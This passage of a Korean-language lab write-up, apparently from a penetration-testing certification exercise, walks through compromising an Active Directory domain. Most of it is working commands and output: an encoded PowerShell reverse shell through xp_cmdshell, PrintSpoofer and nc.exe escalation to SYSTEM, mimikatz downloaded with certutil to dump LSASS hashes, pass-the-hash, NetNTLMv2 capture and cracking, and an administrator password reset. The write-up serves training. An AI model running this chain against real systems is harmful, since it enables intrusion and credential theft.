SMB         172.16.7.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                          
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 
SMB         172.16.7.3      445    DC01             [*] Copying "IT\Private\Development\web.config" to "web.config"
SMB         172.16.7.3      445    DC01             [+] File "IT\Private\Development\web.config" was downloaded to "web.config"
```

`web.config` 내용을 확인한 결과 데이터베이스 연결 문자열에 자격 증명이 하드코딩되어 있었다:

```conf
<add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
```

여기서 사용자명은 `netdb`, 비밀번호는 `D@ta_bAse_adm1n!` 임을 확인할 수 있었다.

데이터베이스용 자격 증명으로 판단되어 SQL01의 MSSQL 서비스에 대해 유효성을 확인하였다:

```bash
$ proxychains -q nxc mssql 172.16.7.60 -u netdb -p D@ta_bAse_adm1n! --local-auth

MSSQL       172.16.7.60     1433   SQL01            [*] Windows 10 / Server 2019 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (EncryptionReq:False)
MSSQL       172.16.7.60     1433   SQL01            [+] SQL01\netdb:D@ta_bAse_adm1n! (Pwn3d!)
```

로그인에 성공했고 MSSQL 모듈에서 `Pwn3d!` 가 표시되었다.

### Abusing SeImpersonatePrivilege

SQL01의 MSSQL 인스턴스에 직접 접속하였다:

```bash
$ python3 mssqlclient.py 'SQL01/netdb:D@ta_bAse_adm1n!@172.16.7.60' 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```

`xp_cmdshell` 을 활성화한 뒤 OS 명령으로 현재 서비스 계정의 Privilege를 확인했고, `SeImpersonatePrivilege` 가 활성화되어 있음을 확인하였다:

```text
SQL> xp_cmdshell "whoami /priv"
                                                                     
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

`SeImpersonatePrivilege` 가 활성화된 서비스 계정 컨텍스트에서는 PrintSpoofer와 같은 토큰 임퍼스네이션 계열 기법을 이용해 SYSTEM 권한 상승을 시도할 수 있다.

현재 제공된 Parrot Linux 호스트의 내부 IP는 `172.16.7.240` 이었다.

SQL01(`172.16.7.60`)과 Parrot 호스트(`172.16.7.240`)는 모두 연결된 `172.16.6.0/23` 대역에 있으므로 SQL01에서 Parrot 호스트로 직접 Reverse Shell 연결을 시도할 수 있었다.

먼저 Parrot 호스트에서 Netcat 리스너를 실행하였다:

```bash
$ nc -lvnp 9001
```

이후 `xp_cmdshell` 을 통해 인코딩된 PowerShell Reverse Shell을 실행하였다:

```text
SQL> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

정상적으로 SQL01에서 리스너로 Reverse Shell 연결이 들어왔다:

```powershell
connect to [172.16.7.240] from (UNKNOWN) [172.16.7.60] 62772

PS C:\Windows\system32> 
```

이제 `SeImpersonatePrivilege` 를 악용하기 위해 SQL Server 서비스 계정의 프로필 디렉터리에 `PrintSpoofer64.exe` 를 내려받았다:

```powershell
PS C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS> wget 172.16.7.240:8000/PrintSpoofer64.exe -O PrintSpoofer64.exe

PS C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS> ls

    Directory: C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        9/15/2018   2:19 AM                Desktop                                                               
d-r---         4/1/2022  10:42 AM                Documents                                                             
d-r---        9/15/2018   2:19 AM                Downloads                                                             
d-r---        9/15/2018   2:19 AM                Favorites                                                             
d-r---        9/15/2018   2:19 AM                Links                                                                 
d-r---        9/15/2018   2:19 AM                Music                                                                 
d-r---        9/15/2018   2:19 AM                Pictures                                                              
d-----        9/15/2018   2:19 AM                Saved Games                                                           
d-r---        9/15/2018   2:19 AM                Videos                                                                
-a----        8/22/2026   3:52 AM         27136 PrintSpoofer64.exe
```

Reverse Shell을 다시 받을 수 있도록 `nc.exe` 도 같은 위치에 내려받았다:

```powershell
PS C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS> wget 172.16.7.240:8000/nc.exe -O nc.exe
```

Parrot 호스트에서 SYSTEM 셸을 받을 두 번째 리스너를 실행하였다:

```bash
$ nc -lvnp 9002
```

이후 PrintSpoofer를 실행하였다:

```powershell
PS C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS> .\PrintSpoofer64.exe -c 'C:\Windows\System32\cmd.exe /c C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\nc.exe 172.16.7.240 9002 -e cmd.exe'

[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

두 번째 리스너에 연결이 들어왔고 `whoami` 결과 `NT AUTHORITY\SYSTEM` 을 확인하였다:

```powershell
connect to [172.16.7.240] from (UNKNOWN) [172.16.7.60] 62793

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### Recovering MSSQLSVC Credentials

SQL01에서 SYSTEM 권한을 확보했으므로 LSASS에 접근할 수 있다. 

현재 세션에 유용한 도메인 자격 증명이 남아 있는지 확인하기 위해 Mimikatz를 업로드하였다:

```powershell
C:\Users\Administrator>certutil -urlcache -split -f http://172.16.7.240:8000/mimikatz.exe mimikatz.exe
```

Mimikatz를 사용한 결과 `mssqlsvc` 의 로그온 세션과 NTLM 해시가 존재하였다:

```powershell
C:\Users\Administrator>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

Authentication Id : 0 ; 227379 (00000000:00037833)
Session           : Interactive from 1
User Name         : mssqlsvc
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 8/22/2026 2:43:07 AM
SID               : S-1-5-21-3327542485-274640656-2609762496-4613
        msv :
         [00000003] Primary
         * Username : mssqlsvc
         * Domain   : INLANEFREIGHT
         * NTLM     : 8c9555327d95f815987c0d81238c7660
         * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
         * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
        tspkg :
        wdigest :
         * Username : mssqlsvc
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : mssqlsvc
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :
```

획득한 `mssqlsvc` NTLM 해시를 이용해 Pass-the-Hash 방식으로 다른 SMB 호스트에서 권한을 확인하였다:

```bash
$ crackmapexec smb 172.16.7.0/24 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660

SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.60     445    SQL01            [+] INLANEFREIGHT.LOCAL\mssqlsvc 8c9555327d95f815987c0d81238c7660 
SMB         172.16.7.50     445    MS01             [+] INLANEFREIGHT.LOCAL\mssqlsvc 8c9555327d95f815987c0d81238c7660 (Pwn3d!)
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\mssqlsvc 8c9555327d95f815987c0d81238c7660
```

MS01의 SMB 결과에서 `Pwn3d!` 가 표시되었으므로 `mssqlsvc` 가 MS01에서 관리자 수준 권한을 가지고 있음을 확인할 수 있었다.

따라서 다시 포트 포워딩을 구성한 뒤 NTLM 해시를 이용해 MS01의 WinRM에 접속하였다:

```bash
$ proxychains -q evil-winrm -i 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660
                                        
*Evil-WinRM* PS C:\Users\mssqlsvc\Documents>
```

정상적으로 `mssqlsvc` 계정으로 MS01에 접근할 수 있었다.

### Capturing CT059 NetNTLMv2 Authentication

MS01의 Security 로그를 확인해 최근 네트워크 로그온 중 재사용할 수 있는 인증 흐름이 있는지 조사하였다:

```powershell
*Evil-WinRM* PS C:\Users\mssqlsvc\Documents> Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 20 | Format-List TimeCreated,Message

TimeCreated : 8/22/2026 6:05:28 AM
Message     : An account was successfully logged on.

              Subject:
                Security ID:            S-1-0-0
                Account Name:           -
                Account Domain:         -
                Logon ID:               0x0

              Logon Information:
                Logon Type:             3
                Restricted Admin Mode:  -
                Virtual Account:                No
                Elevated Token:         No

              Impersonation Level:              Impersonation

              New Logon:
                Security ID:            S-1-5-21-3327542485-274640656-2609762496-4611
                Account Name:           CT059
                Account Domain:         INLANEFREIGHT
                Logon ID:               0x38BDE6
                Linked Logon ID:                0x0
                Network Account Name:   -
                Network Account Domain: -
                Logon GUID:             {00000000-0000-0000-0000-000000000000}

              Process Information:
                Process ID:             0x0
                Process Name:           -

              Network Information:
                Workstation Name:       DC01
                Source Network Address: 172.16.7.3
                Source Port:            64296

              Detailed Authentication Information:
                Logon Process:          NtLmSsp
                Authentication Package: NTLM
                Transited Services:     -
                Package Name (NTLM only):       NTLM V2
                Key Length:             128
```

Event ID 4624 기록에서는 `CT059` 가 DC01 (`172.16.7.3`)에서 MS01로 `Logon Type 3` 네트워크 로그온을 수행했고 인증 패키지로 NTLMv2가 사용된 것을 확인할 수 있다.

따라서 MS01에서 Inveigh를 실행해 들어오는 NTLM 인증을 관찰하고 NetNTLMv2 Challenge-Response를 수집하였다:

그 결과 DC01에서 MS01의 SMB 서비스로 인증을 시도한 `CT059` 의 NetNTLMv2 응답을 획득할 수 있었다:

```powershell
*Evil-WinRM* PS C:\Users\mssqlsvc\Documents> ./Inveigh.exe

[.] [06:13:28] TCP(445) SYN packet from 172.16.7.3:64333
[.] [06:13:28] SMB1(445) negotiation request detected from 172.16.7.3:64333
[.] [06:13:28] SMB2+(445) negotiation request detected from 172.16.7.3:64333
[+] [06:13:28] SMB(445) NTLM challenge [F1821F5B812B5A86] sent to 172.16.7.50:64333
[+] [06:13:28] SMB(445) NTLMv2 captured for [INLANEFREIGHT\CT059] from 172.16.7.3(DC01):64333:
CT059::INLANEFREIGHT:F1821F5B812B5A86:A0CDE59E5938C20F9D40DCB91DE8110B:0101000000000000A6D69CBCA742DD019A27FCB0D4825BFC0000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800A6D69CBCA742DD010600040002000000080030003000000000000000000000000020000027A2054218BAF55ED9596CCBF866B99A9C8F14178575D0668D380F35725E72020A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
[!] [06:13:28] SMB(445) NTLMv2 for [INLANEFREIGHT\CT059] written to Inveigh-NTLMv2.txt
[.] [06:13:29] TCP(5985) SYN packet from 172.16.7.240:37052
[.] [06:13:30] TCP(5985) SYN packet from 172.16.7.240:37054
```

해당 NetNTLMv2 응답을 오프라인 크래킹한 결과 `CT059` 의 비밀번호가 `charlie1` 임을 확인하였다:

```bash
$ hashcat -m 5600 --show 'CT059::INLANEFREIGHT:F1821F5B812B5A86:A0CDE59E5938C20F9D40DCB91DE8110B:0101000000000000A6D69CBCA742DD019A27FCB0D4825BFC0000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800A6D69CBCA742DD010600040002000000080030003000000000000000000000000020000027A2054218BAF55ED9596CCBF866B99A9C8F14178575D0668D380F35725E72020A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000' /usr/share/wordlists/rockyou.txt

<SKIP>:charlie1
```

### Taking Over the Domain Administrator

BloodHound를 확인한 결과 `CT059` 는 `Administrator`, `krbtgt`, `Administrators 그룹` 등에 `GenericAll` 권한을 가지고 있었다. 

특히 `Administrator` 사용자 객체에 대한 `GenericAll` 은 비밀번호 재설정과 같은 강력한 객체 제어를 허용한다:

![Active Directory](/assets/cpts-infra/active-directory-skills-assessment/ad4.png)

따라서 BloodyAD를 이용해 `Administrator` 계정의 비밀번호를 재설정하였다:

```bash
$ proxychains -q bloodyAD -H 172.16.7.3 -d INLANEFREIGHT.LOCAL -u CT059 -p charlie1 set password Administrator 'Asdf1234@'     

[+] Password changed successfully!
```

비밀번호 변경에 성공한 뒤 새 자격 증명으로 DC01에 접속하여 최종적으로 도메인 관리자 권한을 확보하였다:

```bash
$ proxychains -q evil-winrm -i 172.16.7.3 -u Administrator -p Asdf1234@                                                      
                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami

inlanefreight\administrator
```